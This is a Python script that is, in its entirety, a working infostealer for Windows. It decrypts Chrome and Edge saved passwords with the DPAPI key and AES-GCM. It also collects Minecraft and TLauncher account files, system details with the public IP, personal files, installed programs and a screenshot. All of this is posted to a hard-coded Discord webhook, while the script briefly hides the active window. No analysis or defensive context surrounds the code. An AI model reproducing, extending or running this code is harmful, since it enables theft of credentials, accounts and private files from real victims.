#!/usr/bin/env python3
import requests
import os
import shutil
import sqlite3
import win32crypt
import glob
import json
import base64
from Crypto.Cipher import AES
from PIL import ImageGrab
from io import BytesIO
import psutil
import platform
import subprocess
import winreg
import time
import sys
import ctypes
import zipfile

WEBHOOK = "https://discord.com/api/webhooks/1463612309514489923/RjSLX5O96QKRPYq_ygK1MRRt8XBuGLWMQJTb69vTUWXUPHPCPn--PaKFxCjG-kyhgMLN"

def send_file(filename, data):
    files = {filename: (filename, data)}
    for i in range(5):
        try:
            r = requests.post(WEBHOOK, files=files)
            if r.status_code in [200, 204]:
                print(f"✅ {filename} SENT")
                return True
        except:
            pass
        time.sleep(0.5)
    return False

def black_screen_flash():
    """Flash black screen 2 sec"""
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    ctypes.windll.user32.ShowWindow(hwnd, 0)  # Minimize
    time.sleep(2)
    ctypes.windll.user32.ShowWindow(hwnd, 9)  # Restore

def get_system_info():
    return f"""
💻 PC DOX:
OS: {platform.system()} {platform.release()}
User: {os.getlogin()}
PC: {platform.node()}
CPU: {platform.processor()}
RAM: {psutil.virtual_memory().total//(1024**3)}GB
Disk: {psutil.disk_usage('/').total//(1024**3)}GB
IP: {requests.get('https://api.ipify.org').text}
"""

def dox_minecraft():
    mc_data = []
    
    # Minecraft Launchers
    paths = [
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming", ".minecraft", "launcher_profiles.json"),
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Minecraft", "launcher_profiles_microsoft.json"),
        os.path.join(os.path.expanduser("~"), ".minecraft", "launcher_profiles.json")
    ]
    
    for path in paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    data = json.load(f)
                    mc_data.append(f"MC PROFILES: {json.dumps(data, indent=2)}")
            except:
                mc_data.append(f"MC PATH EXISTS: {path}")
    
    # TLauncher
    tlauncher = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "TLauncher", "accounts.json")
    if os.path.exists(tlauncher):
        mc_data.append(open(tlauncher).read())
    
    return mc_data

def dox_browsers():
    pwds = []
    user = os.path.expanduser("~")
    
    browsers = {
        "Chrome": os.path.join(user, "AppData", "Local", "Google", "Chrome", "User Data"),
        "Edge": os.path.join(user, "AppData", "Local", "Microsoft", "Edge", "User Data")
    }
    
    for name, base in browsers.items():
        if os.path.exists(base):
            try:
                # Local State key
                with open(os.path.join(base, "Local State"), 'r') as f:
                    ls = json.load(f)
                key_b64 = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
                key = win32crypt.CryptUnprotectData(key_b64, None, None, None, 0)[1]
                
                # Default Login Data
                db = os.path.join(base, "Default", "Login Data")
                if os.path.exists(db):
                    temp = "temp.db"
                    shutil.copy2(db, temp)
                    conn = sqlite3.connect(temp)
                    c = conn.cursor()
                    c.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in c.fetchall():
                        url, user, pwd = row
                        if pwd:
                            try:
                                if pwd[:3] in [b'v10', b'v11']:
                                    iv = pwd[3:15]
                                    cipher = AES.new(key, AES.MODE_GCM, iv)
                                    dec = cipher.decrypt(pwd[15:])[:-16].decode()
                                else:
                                    dec = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                                pwds.append(f"{name}: {url} | {user}:{dec}")
                            except:
                                pass
                    conn.close()
                    os.unlink(temp)
            except:
                pass
    
    return pwds

def dox_files():
    dox_paths = [
        os.path.join(os.path.expanduser("~"), "Desktop"),
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
        os.path.join(os.path.expanduser("~"), "Pictures")
    ]
    
    file_list = []
    for path in dox_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files[:20]:  # Limit
                    try:
                        fpath = os.path.join(root, file)
                        if os.path.getsize(fpath) < 8*1024*1024:  # <8MB
                            with open(fpath, 'rb') as f:
                                file_list.append((file, f.read()))
                    except:
                        pass
    return file_list

def dox_programs():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        progs = []
        i = 0
        while True:
            try:
                subkey = winreg.EnumKey(key, i)
                sub = winreg.OpenKey(key, subkey)
                try:
                    name, _ = winreg.QueryValueEx(sub, "DisplayName")
                    progs.append(name)
                except:
                    pass
                winreg.CloseKey(sub)
                i += 1
            except:
                break
        winreg.CloseKey(key)
        return progs[:50]
    except:
        return []

def main():
    print("🚀 FULL PC DOX")
    
    # BLACK FLASH
    black_screen_flash()
    
    # SYSTEM INFO
    sys_info = get_system_info()
    requests.post(WEBHOOK, json={"content": sys_info})
    
    # MINECRAFT
    mc = dox_minecraft()
    if mc:
        requests.post(WEBHOOK, json={"content": f"🎮 MINECRAFT ({len(mc)}):\n" + mc[0]})
        send_file("minecraft.json", mc[0].encode())
    
    # PASSWORDS
    pwds = dox_browsers()
    if pwds:
        pwd_text = "\n".join(pwds)
        requests.post(WEBHOOK, json={"content": f"🔑 {len(pwds)} PASSWORDS"})
        send_file("passwords.txt", pwd_text.encode())
    
    # PROGRAMS
    progs = dox_programs()
    requests.post(WEBHOOK, json={"content": f"📱 PROGRAMS ({len(progs)}):\n```" + "\n".join(progs[:10]) + "```"})
    
    # FILES (limit to avoid spam)
    files = dox_files()
    for name, data in files[:5]:  # First 5 files
        send_file(f" dox_{name}", data)
    
    # SCREENSHOT
    img = ImageGrab.grab()
    buffer = BytesIO()
    img.save(buffer, 'PNG')
    send_file("screen_dox.png", buffer.getvalue())
    
    # FINISH
    requests.post(WEBHOOK, json={"content": "✅ FULL PC DOX COMPLETE 💀"})
    
    print("✅ ALL SENT")

if __name__ == "__main__":
    main()